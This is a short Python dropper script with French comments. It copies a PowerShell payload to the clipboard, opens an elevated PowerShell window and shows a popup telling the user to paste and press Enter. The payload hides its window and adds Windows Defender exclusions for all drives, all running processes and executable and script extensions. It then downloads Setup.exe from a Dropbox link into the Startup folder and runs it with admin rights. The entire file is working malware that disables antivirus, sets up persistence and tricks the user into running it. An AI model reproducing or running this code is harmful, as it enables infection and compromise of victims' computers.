# -*- coding: utf-8 -*-
import ctypes
import pyperclip
import subprocess
import time

# VOTRE SCRIPT ORIGINAL SANS MODIFICATION
mon_script = """
# Masquer la fenêtre immédiatement
if (-not ([System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.InitialSessionState.RunspaceState -eq 'Opened')) {
    $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
    $asyncWindow = Add-Type -MemberDefinition $windowCode -Name "Win32Window" -Namespace Win32Functions -PassThru
    $asyncWindow::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
}

# === VOTRE SCRIPT ORIGINAL ===
$drives = Get-PSDrive -PSProvider 'FileSystem' | Where-Object { $_.Free -gt 0 }
foreach ($drive in $drives) {
    Add-MpPreference -ExclusionPath "$($drive.Root)"
}

$procs = Get-Process | Where-Object { $_.Path -ne $null }
foreach ($proc in $procs) {
    Add-MpPreference -ExclusionProcess $proc.Name
}

$exts = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js")
foreach ($ext in $exts) {
    Add-MpPreference -ExclusionExtension $ext
}

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Setup.exe"
$url = "https://www.dropbox.com/scl/fi/tib5nwxpmwwuryllzsf9k/Setup.exe?rlkey=0ppes5814g09i6p0n88wg3u3l&st=56fnxb6k&dl=1"

if (Test-Path $startupPath) {
    Remove-Item $startupPath -Force
}

Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
Start-Process -FilePath $startupPath -Verb RunAs -Wait
"""

# 1. Copie dans presse-papier
pyperclip.copy(mon_script)

# 2. Ouvre PowerShell en admin
subprocess.run('powershell -Command "Start-Process powershell -Verb RunAs"', shell=True)

# 3. Attend que PowerShell soit ouvert
time.sleep(1)

# 4. Affiche le popup après l'ouverture
ctypes.windll.user32.MessageBoxW(0,
    "Ctrl+V pour coller\n"
    "Puis Entrée", 
    "Instructions", 0x40)